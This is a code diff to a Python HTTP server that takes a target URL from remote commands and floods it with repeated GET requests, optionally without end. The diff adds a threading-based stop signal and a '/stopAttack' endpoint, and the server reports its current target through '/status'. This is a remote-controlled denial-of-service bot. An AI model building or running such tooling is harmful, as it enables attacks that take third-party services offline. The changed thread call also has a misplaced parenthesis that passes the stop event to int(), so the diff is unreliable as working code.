@@ -1,9 +1,8 @@
 import json
 import platform
+import threading
 import psutil
-from multiprocessing import Process
 from http.server import BaseHTTPRequestHandler
-
 import requests
 
 
@@ -21,25 +20,37 @@ def get_size(bytes, suffix="B"):
         bytes /= factor
 
 
-def doRequest(url, time):
-    print("Invio richieste")
-    for i in range(time):
+def doRequest(url, time, event):
+    i = 0
+    while (i<time or time==-1) and not event.is_set():
         try:
             print("Doing request at ", url)
             response = requests.get(url)
         except Exception as e:
             print("Request error: ", e)
+        if time!=-1: i += 1
+
 
 
 class HTTPServerRH(BaseHTTPRequestHandler):
     target = ""
     action = "waiting"
-
+    event = threading.Event()
     def do_GET(self):
         if self.path == "/status":
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
+            message = {"target": self.target, "action":self.action}
+            self.wfile.write(json.dumps(message).encode('utf-8'))
+            return
+        if self.path == "/stopAttack":
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.event.set()
+            self.target = ""
+            self.action = "waiting"
             message = {"target": self.target, "action":self.action}
             self.wfile.write(json.dumps(message).encode('utf-8'))
             return
@@ -81,7 +92,7 @@ class HTTPServerRH(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             try:
-                p = Process(target=doRequest, args=(req["url"], int(req["time"])))
+                p = threading.Thread(target=doRequest, args=(req["url"], int(req["time"], self.event)))
                 p.daemon = True
                 p.start()
             except Exception as e:
